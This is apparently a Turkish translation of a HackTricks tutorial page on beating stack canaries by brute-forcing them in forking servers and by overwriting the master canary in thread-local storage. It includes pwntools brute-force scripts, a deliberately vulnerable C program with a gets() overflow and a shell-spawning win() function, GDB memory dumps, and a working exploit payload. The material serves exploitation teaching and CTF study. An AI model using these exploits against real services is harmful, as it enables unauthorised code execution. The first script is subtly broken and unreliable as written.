# BF Forked & Threaded Stack Canaries

<details>

<summary><strong>AWS hacklemeyi sıfırdan ileri seviyeye öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

**Eğer bir canary ve PIE (Pozisyon Bağımsız Yürütülebilir) ile korunan bir ikiliyle karşı karşıyaysanız, muhtemelen bunları atlatmanın bir yolunu bulmanız gerekebilir.**

![](<../../../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
**`checksec`**'in, bir ikilinin bir canary ile korunduğunu bulamayabileceğini unutmayın, bu durum statik olarak derlenmişse ve işlevi tanımlayamıyorsa.\
Ancak, bir değerin bir işlev çağrısının başında yığına kaydedildiğini ve bu değerin çıkış yapmadan önce kontrol edildiğini fark ederseniz, bunu manuel olarak fark edebilirsiniz.
{% endhint %}

## Brute force Canary

Basit bir canary'yi atlatmanın en iyi yolu, ikilinin **her yeni bağlantı kurduğunuzda (ağ hizmeti) çocuk işlemi çıkarması** durumunda, çünkü ona her bağlandığınızda **aynı canary kullanılacaktır**.

Bu durumda, canary'yi atlatmanın en iyi yolu, sadece **her karakteri brute-force etmek** ve tahmin edilen canary baytının doğru olup olmadığını anlamak için programın çöktüğünü veya düzenli akışını sürdürdüğünü kontrol etmektir. Bu örnekte, işlev **(x64 için) 8 Bayt canary'yi brute-force eder** ve doğru tahmin edilen baytı yanlış bayttan ayırt etmek için sadece sunucu tarafından bir **yanıt** gönderilip gönderilmediğini **kontrol eder** (diğer durumlarda başka bir yol, bir **try/except** kullanmaktır):

### Örnek 1

Bu örnek 64 bitler için uygulanmıştır ancak 32 bitler için kolayca uygulanabilir.
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
### Örnek 2

Bu 32 bit için uygulanmıştır, ancak kolayca 64 bit'e değiştirilebilir.\
Ayrıca bu örnekte **programın önce girdinin boyutunu belirten bir baytı ve ardından yükü beklediğine dikkat edin**.
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
known_canary = b""
test_canary = 0x0
len_bytes_to_read = 0x21

for j in range(0, 4):
# Iterate up to 0xff times to brute force all posible values for byte
for test_canary in range(0xff):
print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")

# Send the current input size
target.send(len_bytes_to_read.to_bytes(1, "little"))

# Send this iterations canary
target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

# Scan in the output, determine if we have a correct value
output = target.recvuntil(b"exit.")
if b"YUM" in output:
# If we have a correct value, record the canary value, reset the canary value, and move on
print(" - next byte is: " + hex(test_canary))
known_canary = known_canary + test_canary.to_bytes(1, "little")
len_bytes_to_read += 1
break

# Return the canary
return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
## İş Parçacıkları

Aynı işlemdeki iş parçacıkları da **aynı canary belirteci**'ni paylaşacaklarından dolayı, eğer ikili her saldırı gerçekleştiğinde yeni bir iş parçacığı oluşturursa bir canary'yi **kaba kuvvet** yöntemiyle bulmak mümkün olacaktır.&#x20;

Canary ile korunan bir iş parçacığında meydana gelen bir tampon taşması, işlemi ana canary'sini değiştirmek için kullanılabilir. Sonuç olarak, önlem işe yaramaz hale gelir çünkü kontrol, iki aynı canary ile yapılır (ancak değiştirilmiş).

### Örnek

Aşağıdaki program Tampon Taşması'na karşı savunmasızdır, ancak canary ile derlenmiştir:
```c
#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

// gcc thread_canary.c -no-pie -l pthread -o thread_canary

void win() {
execve("/bin/sh", NULL, NULL);
}

void* vuln() {
char data[0x20];
gets(data);
}

int main() {
pthread_t thread;

pthread_create(&thread, NULL, vuln, NULL);
pthread_join(thread, NULL);

return 0;
}
```
Dikkat edin ki `vuln` bir iş parçası içinde çağrılır. GDB'de `vuln`'e, özellikle programın giriş verilerini okumak için `gets`'i çağırdığı noktaya bakabiliriz:
```bash
gef> break gets
Breakpoint 1 at 0x4010a0
gef> run
...
gef> x/10gx $rdi
0x7ffff7d7ee20: 0x0000000000000000      0x0000000000000000
0x7ffff7d7ee30: 0x0000000000000000      0x0000000000000000
0x7ffff7d7ee40: 0x0000000000000000      0x493fdc653a156800
0x7ffff7d7ee50: 0x0000000000000000      0x00007ffff7e17ac3
0x7ffff7d7ee60: 0x0000000000000000      0x00007ffff7d7f640
```
Yukarıdaki, programın kullanıcı girdisini yazacağı `data` adresini temsil eder. Yığın canary'si `0x7ffff7d7ee48` adresinde bulunur (`0x493fdc653a156800`), ve dönüş adresi `0x7ffff7d7ee50` adresindedir (`0x00007ffff7e17ac3`):
```bash
gef> telescope $rdi 8 -n
0x7ffff7d7ee20|+0x0000|+000: 0x0000000000000000  <-  $rdi
0x7ffff7d7ee28|+0x0008|+001: 0x0000000000000000
0x7ffff7d7ee30|+0x0010|+002: 0x0000000000000000
0x7ffff7d7ee38|+0x0018|+003: 0x0000000000000000
0x7ffff7d7ee40|+0x0020|+004: 0x0000000000000000
0x7ffff7d7ee48|+0x0028|+005: 0x493fdc653a156800  <-  canary
0x7ffff7d7ee50|+0x0030|+006: 0x0000000000000000  <-  $rbp
0x7ffff7d7ee58|+0x0038|+007: 0x00007ffff7e17ac3 <start_thread+0x2f3>  ->  0xe8ff31fffffe6fe9  <-  retaddr[2]
```
Dikkat edin ki, yığın adresleri gerçek yığına ait değildir:
```bash
gef> vmmap stack
[ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start              End                Size               Offset             Perm Path
0x00007ffff7580000 0x00007ffff7d83000 0x0000000000803000 0x0000000000000000 rw- <tls-th1><stack-th2>  <-  $rbx, $rsp, $rbp, $rsi, $rdi, $r12
0x00007ffffffde000 0x00007ffffffff000 0x0000000000021000 0x0000000000000000 rw- [stack]  <-  $r9, $r15
```
İpliğin yığını, ana canary'nin depolandığı Thread Local Storage (TLS) üzerine yerleştirilir:
```bash
gef> tls
$tls = 0x7ffff7d7f640
...
---------------------------------------------------------------------------- TLS ----------------------------------------------------------------------------
0x7ffff7d7f640|+0x0000|+000: 0x00007ffff7d7f640  ->  [loop detected]  <-  $rbx, $r12
0x7ffff7d7f648|+0x0008|+001: 0x00000000004052b0  ->  0x0000000000000001
0x7ffff7d7f650|+0x0010|+002: 0x00007ffff7d7f640  ->  [loop detected]
0x7ffff7d7f658|+0x0018|+003: 0x0000000000000001
0x7ffff7d7f660|+0x0020|+004: 0x0000000000000000
0x7ffff7d7f668|+0x0028|+005: 0x493fdc653a156800  <-  canary
0x7ffff7d7f670|+0x0030|+006: 0xb79b79966e9916c4  <-  PTR_MANGLE cookie
0x7ffff7d7f678|+0x0038|+007: 0x0000000000000000
...
```
{% hint style="info" %}
Yukarıdaki GDB işlevlerinin bazıları, genellikle [hugsy/gef](https://github.com/hugsy/gef)'den daha fazla özelliğe sahip olan [bata24/gef](https://github.com/bata24/gef) adlı bir uzantıda tanımlanmıştır.
{% endhint %}

Sonuç olarak, büyük bir Tampon Taşması, hem yığın kanaryasını hem de TLS'deki ana kanaryayı değiştirmeye izin verebilir. Bu, ofsettir:
```bash
gef> p/x 0x7ffff7d7f668 - $rdi
$1 = 0x848
```
Bu, `win` fonksiyonunu çağırmak için kısa bir exploit'tir:
```python
from pwn import *

context.binary = 'thread_canary'

payload  = b'A' * 0x28                    # buffer overflow offset
payload += b'BBBBBBBB'                    # overwritting stack canary
payload += b'A' * 8                       # saved $rbp
payload += p64(context.binary.sym.win)    # return address
payload += b'A' * (0x848 - len(payload))  # padding
payload += b'BBBBBBBB'                    # overwritting master canary

io = context.binary.process()
io.sendline(payload)
io.interactive()
```
## Diğer örnekler ve referanslar

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html)
* 64 bit, PIE olmayan, nx, BF canary, `execve` çağırmak için belleğe ROP yaz ve oraya atla.
* [http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads](http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads)
* 64 bit, PIE olmayan, nx, thread ve master canary'yi değiştir.
